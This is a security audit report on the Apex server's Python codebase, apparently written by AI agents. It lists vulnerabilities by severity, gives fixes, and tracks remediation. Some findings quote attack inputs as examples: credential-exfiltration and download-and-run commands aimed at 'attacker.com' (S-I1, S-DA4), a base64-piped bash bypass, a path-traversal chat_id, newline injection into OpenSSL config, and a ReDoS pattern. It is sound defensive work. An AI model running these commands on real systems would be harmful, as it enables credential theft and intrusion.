# Apex Server Security Audit — 2026-03-31

Full codebase security audit across 5 parallel lanes. Each lane read and analyzed specific server modules for vulnerabilities.

**Audited by:** Claude Opus 4.6 (5 parallel agents) + Codex (gpt-5.4, cross-validation)
**Branch:** dev (`ca645bf`)
**Scope:** All server-side Python — auth, WebSocket, input validation, data storage, dashboard/admin

---

## Executive Summary

| Severity | Count |
|----------|-------|
| CRITICAL | 5 |
| HIGH | 11 |
| MEDIUM | ~18 |
| LOW | ~12 |
| INFO | 4 |

**3 bugs found** that cause silent runtime failures (NameError / missing imports).

---

## Top 5 — Fix Immediately

1. **Local model bash tool** (`local_model/tools/bash_tool.py` + `safety.py`) — substring blocklist with `shell=True` is trivially bypassed. Needs allowlist or sandbox.
2. **OpenSSL SAN injection** (`dashboard.py:1662-1703`) — newline injection in SAN values writes arbitrary OpenSSL config directives. Could issue certs with `CA:TRUE`.
3. **mTLS fail-open** (`apex.py:269-281`, `ws_handler.py:82-94`) — if `tls_ext` is None, requests pass without cert check. Invert the guard: reject unless cert positively confirmed.
4. **Path traversal via chat_id** (`streaming.py:433-434`) — unsanitized chat_id in journal file paths. Validate format `^[0-9a-f]{8}$` before any filesystem op.
5. **`runpy.run_path`** (`dashboard.py:3777-3779`) — executes workspace Python files in server process. Replace with `ast.literal_eval` or regex extraction.

---

## Bugs Found (Silent Failures)

| File | Lines | Bug | Impact |
|------|-------|-----|--------|
| `db.py` | 45, 248 | `_APEX_ROOT` should be `APEX_ROOT` | Alert category mapping and persona template seeding never work |
| `memory_extract.py` | 183-186 | Missing `import os` | Guardrail whitelist creation crashes with NameError |
| `dashboard.py` | 1015-1016 | Missing `import sys` | SSL keystore operations silently fail |

---

## Lane 1: Auth & mTLS

Audited: `apex.py`, `env.py`, `routes_misc.py`

### S-A1 — mTLS enforcement is conditional and fail-open
- **Severity:** HIGH
- **File:** `apex.py`, lines 269-281
- **Description:** The `verify_client_cert` middleware only attempts cert verification when `SSL_CERT and SSL_CA` are both truthy. If either is empty, mTLS is silently skipped and all routes become unauthenticated. On line 278, the check `if tls_ext is not None and peer_cert is None` means that if `tls_ext` is `None` (no TLS extension in ASGI scope), the middleware falls through — effectively allowing the request without cert verification.
- **Fix:** Fail closed. When mTLS is configured, reject unless a valid peer cert is positively confirmed. If neither `tls_ext` nor transport yields a peer cert, deny.

### S-A2 — WebSocket mTLS same fail-open pattern
- **Severity:** HIGH
- **File:** `ws_handler.py`, lines 82-94
- **Description:** Same logic as S-A1. If `tls_ext` is `None`, the WebSocket connection is accepted without cert verification. An attacker reaching the port through a reverse proxy that strips TLS context would bypass mTLS.
- **Fix:** Same as S-A1 — fail closed.

### S-A3 — `.p12` private key download via GET
- **Severity:** HIGH
- **File:** `dashboard.py`, lines 1340-1365
- **Description:** `GET /api/tls/clients/{cn}/p12` serves client private key bundles. GET requests bypass the dashboard's CSRF check (`X-Requested-With` header only enforced on PUT/POST/DELETE). Any authenticated user with the client cert in their browser could be tricked into clicking a link that downloads another client's private key.
- **Fix:** Change to POST, add a one-time download token, or require the admin bearer token specifically.

### S-A4 — `/api/health` not in `_PUBLIC_ROUTES`
- **Severity:** MEDIUM
- **File:** `apex.py`, line 251; `routes_misc.py`, line 155
- **Description:** Health endpoint registered at both `/health` and `/api/health`, but `_PUBLIC_ROUTES` only contains `/health`. The `/api/health` path depends on the fail-open mTLS logic to pass through.
- **Fix:** Add `/api/health` to `_PUBLIC_ROUTES`, or remove the duplicate route.

### S-A5 — Rate limit buckets unbounded
- **Severity:** MEDIUM
- **File:** `apex.py`, lines 326-347; `state.py`, line 122
- **Description:** `_rate_buckets` dict grows without bound. Each unique `client_ip:path` creates a new entry. Stale buckets (all timestamps expired) are never removed. IP-rotating attacker can exhaust memory.
- **Fix:** Add periodic cleanup of stale buckets. Cap total tracked IPs.

### S-A6 — DB export via GET bypasses CSRF
- **Severity:** MEDIUM
- **File:** `dashboard.py`, lines 3372-3387
- **Description:** `GET /api/db/export` returns the entire database file. GET requests bypass CSRF checks. Browser with client cert could be tricked into downloading the DB.
- **Fix:** Change to POST, or add CSRF token check for sensitive GETs.

### S-A7 — Admin token optional
- **Severity:** MEDIUM
- **File:** `dashboard.py`, lines 181-214; `env.py`, line 155
- **Description:** `APEX_ADMIN_TOKEN` defaults to empty. When unset, any mTLS-authenticated client is a full admin — can update credentials, rotate tokens, vacuum DB, generate certs, purge messages.
- **Fix:** Require admin token when dashboard is enabled, or implement cert-based role separation.

### S-A8 — `_update_env_var` doesn't quote values
- **Severity:** MEDIUM
- **File:** `dashboard.py`, lines 1845-1884
- **Description:** Writes `KEY=value` lines without quoting. Values containing spaces, `#`, or `$` will be misinterpreted when `.env` is sourced by shell scripts.
- **Fix:** Wrap values in double quotes: `{key}="{value}"`, escape embedded quotes.

### S-A9 — Health endpoint information disclosure
- **Severity:** LOW
- **File:** `routes_misc.py`, lines 155-168
- **Description:** Public `/health` endpoint returns client count, chat count, model name, version, branch, and commit hash.
- **Fix:** Reduce public response to `{"ok": true}`. Move details to authenticated endpoint.

### S-A10 — WS allows null Origin when mTLS configured
- **Severity:** LOW
- **File:** `agent_sdk.py`, lines 451-460
- **Description:** When `Origin` header is absent, function returns `True` if SSL_CA is set. Non-browser clients bypass origin check.
- **Fix:** Consider requiring Origin header; reject connections without it.

### S-A11 — Duplicate alert token check
- **Severity:** LOW
- **File:** `apex.py`, lines 262-267; `routes_alerts.py`, lines 154-159
- **Description:** Identical bearer token check in two locations. Fragile — modifying one location leaves the other as sole gate.
- **Fix:** Consolidate to a single location.

### S-A12 — Alert client disables TLS verification (Codex finding)
- **Severity:** HIGH
- **File:** `alert_client.py`, lines 20-27
- **Description:** The bundled alert client sets `check_hostname = False` and `verify_mode = ssl.CERT_NONE`, then sends the bearer token over that unverified channel. Exposes alert traffic to MITM, token theft, and server spoofing. Discovered by Codex cross-validation audit — missed by all 5 parallel lanes because `alert_client.py` wasn't in any file list.
- **Fix:** Enable TLS verification. Use the CA cert (`SSL_CA`) for server verification. If self-signed, load the CA into the SSL context instead of disabling verification.

---

## Lane 2: WebSocket & Streaming

Audited: `ws_handler.py`, `streaming.py`, `state.py`

### S-W1 — No authentication on WebSocket connection
- **Severity:** CRITICAL
- **File:** `ws_handler.py`, lines 80-100
- **Description:** The `/ws` endpoint performs only origin checking and optional mTLS. No user-level token, session cookie, or API key. Any client passing origin validation has full control.
- **Note:** mTLS at the transport layer IS the auth gate. This finding assumes mTLS is bypassed (see S-A1/S-A2). If mTLS is solid, this is mitigated.
- **Fix:** Add token-based authentication to WebSocket handshake as defense-in-depth.

### S-W2 — No authorization — any WS can access any chat
- **Severity:** CRITICAL
- **File:** `ws_handler.py`, lines 126-301
- **Description:** `attach` accepts any `chat_id` with no ownership check. `send` dispatches prompts to any chat. `stop` cancels any stream. Combined with S-W1, any connected client has full access to all chats.
- **Note:** Same mTLS caveat as S-W1. Single-user deployment mitigates this.
- **Fix:** Enforce per-user chat ownership after authentication.

### S-W3 — Global model change without authorization
- **Severity:** HIGH
- **File:** `ws_handler.py`, lines 230-248
- **Description:** `set_model` action allows any WS client to change the global server model. This NULLs every chat's `claude_session_id` across the entire DB and disconnects all SDK clients. Server-wide destructive operation with no auth check.
- **Fix:** Restrict to admin-authenticated WS or move to authenticated HTTP endpoint. Validate model against whitelist.

### S-W4 — Path traversal in stream journal via chat_id
- **Severity:** HIGH
- **File:** `streaming.py`, lines 433-434
- **Description:** `_stream_journal_path` constructs path as `_STREAM_JOURNAL_DIR / f"{chat_id}.jsonl"` with no sanitization. Client-supplied `chat_id` like `../../etc/cron.d/evil` could write, read, or delete arbitrary files.
- **Fix:** Validate `chat_id` format with strict regex `^[0-9a-f]{8}$` at WS message dispatch level.

### S-W5 — Unbounded in-memory dict growth (DoS)
- **Severity:** MEDIUM
- **File:** `state.py`, lines 92-116
- **Description:** Multiple dicts grow without bounds: `_chat_locks`, `_chat_send_locks`, `_ws_send_count`, `_ws_fail_count`, `_client_sessions`, `_compaction_summaries`, `_whisper_last`. Attacker sending randomized chat_ids forces unbounded memory growth.
- **Fix:** Add LRU eviction or TTL-based cleanup. Periodic sweep for stale entries.

### S-W6 — No rate limiting on WebSocket messages
- **Severity:** MEDIUM
- **File:** `ws_handler.py`, lines 118-301
- **Description:** No per-connection or per-chat rate limiting. Client can flood `send` actions creating unlimited asyncio Tasks. `_rate_buckets` only applies to HTTP routes.
- **Fix:** Per-connection and per-chat rate limiting for WS messages. Cap concurrent active tasks per connection.

### S-W7 — Error messages leak internal state
- **Severity:** MEDIUM
- **File:** `ws_handler.py`, lines 651-660
- **Description:** Raw exception messages forwarded to client: `f"Claude request failed: {fresh_error}"`. Can contain internal paths, SDK version info, auth errors, backend config.
- **Fix:** Send generic error messages to clients. Log detailed errors server-side only.

### S-W8 — Journal writes before chat existence check
- **Severity:** MEDIUM
- **File:** `ws_handler.py`, lines 126-165; `streaming.py`, lines 505-515
- **Description:** `attach` handler calls `_load_journal_events(attach_id)` and `_cleanup_stream_journal(attach_id)` before verifying chat exists in DB. Combined with S-W4, widens path traversal attack surface.
- **Fix:** Validate chat existence and format before any journal operations.

### S-W9 — Client can supply own stream_id
- **Severity:** LOW
- **File:** `ws_handler.py`, line 285; `streaming.py`, line 50-51
- **Description:** Client can set `stream_id` that collides with another stream, potentially hijacking cancellation via `stop` action.
- **Fix:** Always generate stream_id server-side. Ignore client-supplied values.

### S-W10 — `_set_model` global variable mutation inconsistent
- **Severity:** LOW
- **File:** `streaming.py`, lines 603-613
- **Description:** `_set_model` modifies `streaming.MODEL` via `global`, but other modules imported `MODEL` from `env` at load time and retain old binding.
- **Fix:** Store current model in mutable container in `state.py`.

---

## Lane 3: Input Validation & Injection

Audited: `backends.py`, `routes_chat.py`, `routes_upload.py`, `skills.py`, `context.py`, `local_model/`

### S-I1 — Bash tool blocklist bypass (shell=True)
- **Severity:** CRITICAL
- **File:** `local_model/tools/bash_tool.py`, line 27; `local_model/safety.py`, lines 12-48
- **Description:** Bash tool executes LLM-generated commands with `shell=True` using a substring-match blocklist. Trivially bypassable: `find / -delete`, `echo <b64> | base64 -d | bash`, backtick execution, variable interpolation. Credential exfiltration completely unblocked (`cat ~/.apex/.env`, `curl attacker.com -d @~/.apex/.env`).
- **Fix:** Replace blocklist with allowlist. Use `shell=False` with argument lists. Add path-based restrictions for credential files. Consider container/sandbox isolation.

### S-I2 — Write/Read tool path traversal
- **Severity:** HIGH
- **File:** `local_model/tools/write_file.py`, lines 14-18; `local_model/tools/read_file.py`; `local_model/safety.py`, lines 28-38
- **Description:** `validate_path` blocks only a small set of system paths (`/System`, `/usr/bin`, `/etc/passwd`). LLM tool calls can overwrite `~/.apex/.env`, `~/.ssh/authorized_keys`, `~/.bashrc`, or server code itself.
- **Fix:** Workspace containment: only allow writes within configured `WORKSPACE`. Block dotfiles and `server/` directory.

### S-I3 — Search tool unrestricted filesystem traversal
- **Severity:** MEDIUM
- **File:** `local_model/tools/search_files.py`, lines 15-27
- **Description:** LLM-provided `search_path` passed to subprocess with no path restriction. Can search through `/etc/`, `/var/log/`, credential files.
- **Fix:** Restrict `search_path` to within workspace directory.

### S-I4 — SSRF via Ollama/MLX base URL
- **Severity:** MEDIUM
- **File:** `local_model/tool_loop.py`, lines 25-31; `backends.py`, lines 528-532
- **Description:** HTTP requests to `OLLAMA_BASE_URL` and `MLX_BASE_URL` with no host restrictions. If model configuration becomes user-settable, exploitable for SSRF.
- **Fix:** Validate API URLs resolve to expected hosts. Pin base URLs at startup.

### S-I5 — SQL LIKE wildcard injection in dashboard search
- **Severity:** LOW
- **File:** `dashboard.py`, lines 4084-4093
- **Description:** `%` and `_` wildcards in SQLite LIKE not escaped. Limited impact — admin-only interface.
- **Fix:** Escape wildcards or use `INSTR()`.

### S-I6 — Upload filename UUID truncation
- **Severity:** LOW
- **File:** `routes_upload.py`, lines 63-65
- **Description:** File ID is `uuid4().hex[:8]` (32 bits). High upload volume risks collisions/overwrites.
- **Fix:** Use full UUID hex (32 chars).

### S-I7 — Codex thread ID not validated
- **Severity:** LOW
- **File:** `backends.py`, lines 146-149
- **Description:** `existing_thread` from DB passed as CLI positional arg without format validation.
- **Fix:** Validate format (alphanumeric/UUID) before subprocess.

### S-I8 — WebSocket auth relies solely on TLS layer
- **Severity:** MEDIUM
- **File:** `apex.py`, lines 254-266; `ws_handler.py`
- **Description:** No app-level auth on WebSocket. If mTLS is ever bypassed or proxy strips TLS context, full access.
- **Fix:** Add explicit authentication check in WS handler as defense-in-depth.

---

## Lane 4: Data Storage & Secrets

Audited: `db.py`, `log.py`, `config.py`, `license.py`

### S-D1 — DB file default permissions (world-readable)
- **Severity:** MEDIUM
- **File:** `db.py`, line 81
- **Description:** `_init_db()` sets directory to `0o700` but never sets DB file permissions. SQLite creates with umask default (`0o644`). DB contains chat messages, alerts, device tokens.
- **Fix:** `os.chmod(DB_PATH, 0o600)` after creation. Also chmod WAL/SHM sidecars.

### S-D2 — License file permissive permissions
- **Severity:** MEDIUM
- **File:** `license.py`, lines 302-305
- **Description:** `license.json` written with default umask. Contains signed license payload.
- **Fix:** `os.chmod(self._license_path, 0o600)` after writing.

### S-D3 — Config state dir not guaranteed 0o700
- **Severity:** MEDIUM
- **File:** `config.py`, lines 234-241
- **Description:** `state/` directory permissions depend on which module initializes first. If config saves before DB init, directory could be world-readable.
- **Fix:** `os.chmod(self._state_dir, 0o700)` in `save()`.

### S-D4 — `mlx_url` config accepts arbitrary URLs (SSRF)
- **Severity:** MEDIUM
- **File:** `config.py`, lines 64-69
- **Description:** `ollama_url` has URL validation but `mlx_url` does not. Admin could set `mlx_url` to internal service for SSRF.
- **Fix:** Apply same URL validation as `ollama_url`.

### S-D5 — User transcription content logged
- **Severity:** MEDIUM
- **File:** `routes_upload.py`, line 177
- **Description:** First 60 chars of audio transcription written to log file. Could contain PII, passwords, financial details.
- **Fix:** Log only length: `log(f"transcribed: {len(text)} chars")`.

### S-D6 — Recall search terms logged verbatim
- **Severity:** MEDIUM
- **File:** `skills.py`, line 91
- **Description:** `log(f"Recall keyword search: {query!r}")` logs user search queries.
- **Fix:** In non-debug mode, log only query length or hash.

### S-D7 — Trial reset via DB deletion
- **Severity:** LOW
- **File:** `license.py`, lines 376-381
- **Description:** Trial start stored in SQLite. Deleting DB restarts trial. No tamper detection.
- **Fix:** Bind trial to server-side record during check-in, or store signed trial-start token.

### S-D8 — Log file default permissions
- **Severity:** LOW
- **File:** `log.py`, line 29
- **Description:** Log file created with default umask, not explicit `0o600`.
- **Fix:** `os.chmod(LOG_PATH, 0o600)` on first creation.

### S-D9 — xAI error body logged
- **Severity:** LOW
- **File:** `context.py`, line 341
- **Description:** Up to 300 chars of API error response logged. Could echo back auth headers.
- **Fix:** Log only HTTP status code and generic message.

### S-D10 — Silent log failure swallowing
- **Severity:** LOW
- **File:** `log.py`, lines 31-32
- **Description:** `except Exception: pass` silently drops all logging failures. Audit trail loss goes undetected.
- **Fix:** Print to stderr on failure. One-time fallback notification.

### S-D11 — `_APEX_ROOT` NameError (BUG)
- **Severity:** LOW (bug, not vuln)
- **File:** `db.py`, lines 45, 248
- **Description:** References `_APEX_ROOT` but import is `APEX_ROOT` (no underscore). Wrapped in `try/except`, silently ignored. Alert category mapping and persona template seeding never work.
- **Fix:** Change `_APEX_ROOT` to `APEX_ROOT`.

### Positive Findings
- All SQL queries use parameterized values (70+ queries audited)
- No `eval()`, `pickle`, `marshal`, `exec()`, or `yaml.load` found
- Secrets not logged directly — env.py has explicit masking policy

---

## Lane 5: Dashboard & Admin Routes

Audited: `dashboard.py`, `routes_alerts.py`, `routes_profiles.py`, `routes_models.py`, `memory_extract.py`

### S-DA1 — OpenSSL CN injection in CA generation
- **Severity:** CRITICAL
- **File:** `dashboard.py`, lines 1739-1770
- **Description:** `POST /api/tls/ca/generate` accepts `cn` from user input, passes it directly to openssl `-subj` as `f"/CN={cn}"`. Unlike client cert generation (which validates via `_CN_RE`), CA `cn` is only `.strip()`-ed. Attacker could inject additional subject fields: `cn="Apex CA/O=Evil/emailAddress=attacker@evil.com"`. Uses subprocess list args (no shell injection), but openssl subject injection is real.
- **Fix:** Apply `_validate_cn()` regex to CA `cn`. Reject `/`, `\`, `"`, and control characters.

### S-DA2 — SAN value injection writes arbitrary OpenSSL config
- **Severity:** CRITICAL
- **File:** `dashboard.py`, lines 1662-1703
- **Description:** `PUT /api/tls/sans` validates SAN entries only with `^(IP|DNS):.+$`. Value after colon written directly into `ext.cnf`. Newline injection like `DNS:localhost\n\n[new_section]\nmalicious = true` writes arbitrary OpenSSL config directives used during cert signing. Could issue certs with `CA:TRUE`.
- **Fix:** Validate IPs via `ipaddress.ip_address()`, DNS via hostname regex. Reject all whitespace and control characters.

### S-DA3 — ReDoS in log search
- **Severity:** HIGH
- **File:** `dashboard.py`, lines 3173-3179
- **Description:** `GET /api/logs` compiles user-supplied `search` param directly as regex. Malicious pattern `(a+)+$` causes catastrophic backtracking, blocking event loop.
- **Fix:** Use `re.escape(search)` for literal matching, or reject nested quantifiers, or run in `asyncio.to_thread` with timeout.

### S-DA4 — MCP server config: insufficient command validation
- **Severity:** HIGH
- **File:** `dashboard.py`, lines 808-813
- **Description:** MCP stdio server validation only checks for `..` in command. Attacker could configure `/bin/sh` with args `["-c", "curl attacker.com | bash"]`. Args only type-checked, not content-checked. `env` dict allows setting `PATH`, `LD_PRELOAD`.
- **Fix:** Allowlist known MCP server binaries. Validate args for shell metacharacters. Block dangerous env vars.

### S-DA5 — Alert token rotation doesn't invalidate old token
- **Severity:** HIGH
- **File:** `dashboard.py`, lines 2309-2334; `routes_alerts.py`, line 35; `apex.py`, line 127
- **Description:** Token rotation writes to `.env` and `os.environ`, but module-level `ALERT_TOKEN` captured at import time retains old value. Old compromised token remains valid until server restart.
- **Fix:** After rotation, update module-level vars: `routes_alerts.ALERT_TOKEN = new_token`. Or read from `os.environ` at request time.

### S-DA6 — `runpy.run_path` executes arbitrary Python
- **Severity:** HIGH
- **File:** `dashboard.py`, lines 3777-3779
- **Description:** `_load_guardrail_summary()` uses `runpy.run_path()` to execute workspace Python files in the server process. If attacker modifies those files (via workspace PUT endpoints or compromised agent), they get arbitrary code execution.
- **Fix:** Parse with `ast.literal_eval` or regex extraction instead of executing. Hash guardrail files at startup, refuse re-execution if changed.

### S-DA7 — No CSRF on main app routes
- **Severity:** MEDIUM
- **File:** `routes_alerts.py`, `routes_profiles.py`, `routes_models.py`
- **Description:** CSRF header check (`X-Requested-With`) only in dashboard sub-app. Main app POST/PUT/DELETE routes (profile CRUD, alert ops, model config) have no CSRF protection. Browser with client cert could be exploited cross-origin.
- **Fix:** Add `X-Requested-With` check to main app middleware for state-changing methods.

### S-DA8 — No size limits on content write endpoints
- **Severity:** MEDIUM
- **File:** `dashboard.py` (project-md, memory writes); `routes_profiles.py` (system_prompt, memories)
- **Description:** Several endpoints accept arbitrary-length content. Multi-gigabyte writes could cause disk exhaustion.
- **Fix:** Add max content size checks (1MB project-md, 64KB memories, 256KB system prompts).

### S-DA9 — Missing `import os` in memory_extract.py (BUG)
- **Severity:** MEDIUM
- **File:** `memory_extract.py`, lines 183-186
- **Description:** `_add_whitelist_entry` calls `os.chmod()` but `os` is never imported. Crashes with NameError on whitelist creation.
- **Fix:** Add `import os` to imports.

### S-DA10 — Missing `import sys` in dashboard.py (BUG)
- **Severity:** MEDIUM
- **File:** `dashboard.py`, lines 1015-1016
- **Description:** `_get_ssl_keystore()` references `sys.path` but `sys` not imported. Silently fails, preventing encrypted key operations.
- **Fix:** Add `import sys` to imports.

### S-DA11 — DELETE /api/alerts wipes all alerts
- **Severity:** MEDIUM
- **File:** `routes_alerts.py`, lines 255-264
- **Description:** `DELETE /api/alerts` (no ID) runs `DELETE FROM alerts`. No confirmation mechanism, no audit logging. Client bug could accidentally wipe entire alert history.
- **Fix:** Require `confirm=true` param. Log caller identity. Consider `POST /api/alerts/purge`.

### S-DA12 — Memory tag category not validated
- **Severity:** LOW
- **File:** `memory_extract.py`, lines 143-155
- **Description:** `category` from `<memory>` tags passed directly to DB. No validation against expected values. Prompt injection could create memories with arbitrary categories bypassing scoring.
- **Fix:** Validate against allowlist, default to "note" for unknown.

### S-DA13 — No max length on persona memory content
- **Severity:** LOW
- **File:** `routes_profiles.py`, lines 492-502
- **Description:** Only checks content is non-empty. Large entries degrade scoring (O(n*m) word overlap) and inflate context.
- **Fix:** Add max length (e.g., 2000 chars).

### S-DA14 — Device token weak validation
- **Severity:** LOW
- **File:** `routes_alerts.py`, lines 290-315
- **Description:** Validates only `len(token) >= 20`. No format check (APNs = hex, 64 chars), no platform validation, no rate limit. Attacker could register thousands of fake tokens causing push notification flood.
- **Fix:** Validate hex format + length. Constrain platform allowlist. Rate limit registrations. Cap total devices.

---

## Recommended Fix Order

### Phase 1 — Critical (same day)
1. S-DA1: Validate CA `cn` with `_validate_cn()` regex
2. S-DA2: Strict SAN value validation (IP/DNS format, reject control chars)
3. S-I1: Replace bash tool blocklist with allowlist + workspace containment
4. S-A1 + S-A2: Invert mTLS guard to fail-closed
5. S-W4: Validate chat_id format `^[0-9a-f]{8}$`

### Phase 2 — High (this week)
6. S-DA6: Replace `runpy.run_path` with safe parsing
7. S-DA3: Escape regex in log search or use literal matching
8. S-DA4: MCP command allowlist + env var blocklist
9. S-DA5: Fix alert token rotation to invalidate old value
10. S-A3: Change p12 download to POST
11. S-I2: Workspace containment for local model tools
12. S-W3: Auth-gate `set_model` action
13. S-A12: Fix alert client TLS verification (enable cert check with CA)

### Phase 3 — Medium (this sprint)
13. Fix bugs: `_APEX_ROOT` → `APEX_ROOT`, add `import os`, add `import sys`
14. S-D1 + S-D2 + S-D3 + S-D8: File permission hardening (0o600)
15. S-DA7: CSRF on main app routes
16. S-DA8: Content size limits
17. S-W5 + S-A5: Bounded dict growth / LRU eviction
18. S-W6: WS rate limiting
19. S-W7: Sanitize error messages to clients
20. S-D5 + S-D6: Stop logging user content

### Phase 4 — Low (backlog)
21. All LOW and INFO findings

---

## Fix Status Tracking

Track remediation progress against audit findings. Updated as fixes land.

| ID | Title | Severity | Phase | Status | Fixed By | Date | Notes |
|----|-------|----------|-------|--------|----------|------|-------|
| S-A3 | `.p12` download + dashboard GET bypass | HIGH | 2 | ✅ Fixed | Codex | 2026-03-31 | Admin bearer token now required on all non-exempt dashboard routes (GET + mutations). Cookie/header auth path added so dashboard UI still functions. Also closes S-A6 (DB export GET bypass). |
| S-A12 | Alert client TLS verification disabled | HIGH | 2 | ✅ Fixed | Codex | 2026-03-31 | Removed `CERT_NONE` / `check_hostname=False` fallback. HTTPS alert delivery now fails closed unless `APEX_SSL_CA` is configured and readable. |
| S-DA1 | OpenSSL CN injection in CA generation | CRITICAL | 1 | ✅ Fixed | Maintainer | 2026-03-31 | Fixed in `2f41199` by validating certificate CNs against a strict `[a-zA-Z0-9-]{1,64}` allowlist before OpenSSL `-subj` generation. |
| S-DA2 | SAN value injection via newline | CRITICAL | 1 | ✅ Fixed | Maintainer | 2026-03-31 | Fixed in `2f41199` by rejecting control characters and whitespace in SAN values and validating IP/DNS entries before writing OpenSSL config. |
| S-I1 | Bash tool blocklist bypass (`shell=True`) | CRITICAL | 1 | ✅ Fixed | Maintainer | 2026-03-31 | Fixed in `fb20623` by requiring explicit `APEX_ALLOW_LOCAL_TOOLS` opt-in, gating backend tool dispatch, and failing closed inside the local tool loop. |
| S-A1 | mTLS fail-open in `apex.py` | HIGH | 1 | ✅ Fixed | Maintainer | 2026-03-31 | Fixed in `30d15a6` by failing closed at startup when TLS files are missing and requiring client cert verification at the TLS handshake layer. |
| S-A2 | mTLS fail-open in `ws_handler.py` | HIGH | 1 | ✅ Fixed | Maintainer | 2026-03-31 | Fixed in `30d15a6` by treating partial TLS client-auth config as mTLS-required and relying on handshake enforcement before ASGI/WS handling. |
| S-W4 | Path traversal via `chat_id` | HIGH | 1 | ✅ Fixed | Maintainer | 2026-03-31 | Fixed in `30d15a6` by enforcing `^[0-9a-f]{8}$` chat ID validation before journal path construction and WS attach/recovery entry points. |
| S-DA6 | `runpy.run_path` arbitrary execution | HIGH | 2 | ✅ Fixed | Maintainer | 2026-03-31 | Fixed in `d0a2bc2` by replacing `runpy.run_path` with AST-based parsing that only evaluates a constrained subset of Python expressions. |
| S-DA3 | ReDoS in log search | HIGH | 2 | ✅ Fixed | Maintainer | 2026-03-31 | Fixed in `d0a2bc2` by escaping user-supplied log search text with `re.escape()` before compiling the regex. |
| S-DA4 | MCP command insufficient validation | HIGH | 2 | ✅ Fixed | Codex | 2026-04-01 | Hardened `_validate_mcp_server()` to resolve commands with `shutil.which()`, allow only approved MCP launchers/binaries, reject shell metacharacters in args, and block dangerous env vars. |
| S-DA5 | Alert token rotation doesn't invalidate old | HIGH | 2 | ✅ Fixed | Maintainer | 2026-03-31 | Fixed in `d0a2bc2` by updating the live alert token in `os.environ`, `env.ALERT_TOKEN`, and `apex.ALERT_TOKEN` immediately on rotation. |
| S-I2 | Write/Read tool path traversal | HIGH | 2 | ✅ Fixed | Maintainer | 2026-03-31 | Fixed in `d0a2bc2` by enforcing workspace containment via `ensure_workspace_path()` across file tools and retaining sensitive-path / dotfile blocks as defense in depth. |
| S-W3 | `set_model` ungated global change | HIGH | 2 | ✅ Fixed | Maintainer | 2026-03-31 | Fixed in `d0a2bc2` by requiring `env.ADMIN_TOKEN`, validating it with `hmac.compare_digest()`, and rejecting models outside `get_available_model_ids()`. |
